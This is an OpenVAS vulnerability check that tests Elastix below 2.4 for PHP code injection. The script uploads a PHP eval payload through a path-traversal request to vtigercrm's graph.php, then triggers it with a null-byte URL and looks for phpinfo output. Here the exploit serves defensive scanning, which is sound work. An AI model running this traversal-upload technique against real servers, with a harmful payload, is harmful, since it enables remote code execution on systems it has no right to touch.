###############################################################################
# OpenVAS Vulnerability Test
#
# Elastix < 2.4 PHP Code Injection  Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103638");
  script_version("2020-11-30T09:15:21+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2020-11-30 09:15:21 +0000 (Mon, 30 Nov 2020)");
  script_tag(name:"creation_date", value:"2013-01-09 16:47:16 +0100 (Wed, 09 Jan 2013)");
  script_name("Elastix < 2.4 PHP Code Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119253/elastix23-exec.txt");

  script_tag(name:"summary", value:"Elastix is prone to a php code injection vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary php code within
  the context of the affected webserver process.");

  script_tag(name:"affected", value:"Elastix < 2.4 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 2.4 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

req = http_get(item:"/vtigercrm/index.php", port:port);
buf = http_send_recv(port:port, data:req);

if("Set-Cookie" >!< buf || "vtiger" >!< buf)
  exit(0);

cookie = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^; ]+)", string:buf);
if(isnull(cookie[1]))
  exit(0);

co = cookie[1];
host = http_host_name(port:port);

req = string(
"POST /vtigercrm/graph.php?module=../modules/Settings&action=savewordtemplate HTTP/1.1\r\n",
"Host: ", host, "\r\n",
"Accept: */*\r\n",
"Content-Length: 477\r\n",
"Cookie: PHPSESSID=", co, "\r\n",
"Expect: 100-continue\r\n",
"Content-Type: multipart/form-data; boundary=----------------------------ac484ab8c486\r\n",
"\r\n",
"------------------------------ac484ab8c486\r\n",
'Content-Disposition: form-data; name="binFile"; filename="xy.txt"', "\r\n",
"Content-Type: application/octet-stream\r\n",
"\r\n",
'<?eval(phpinfo()); ?>', "\r\n",
"------------------------------ac484ab8c486--");

buf = http_send_recv(port:port, data:req);
if("HTTP/1.1 100 Continue" >!< buf)
  exit(0);

url = string("/vtigercrm/graph.php?module=../test/upload&action=xy.txt%00");
req = string(
"POST ", url, " HTTP/1.1\r\n",
"Host: ", host, "\r\n",
"Accept: */*\r\n",
"Cookie: PHPSESSID=", co, "\r\n",
"Content-Length: 0\r\n",
"Content-Type: application/x-www-form-urlencoded\r\n\r\n");

buf = http_send_recv(port:port, data:req);
if("<title>phpinfo()" >< buf) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
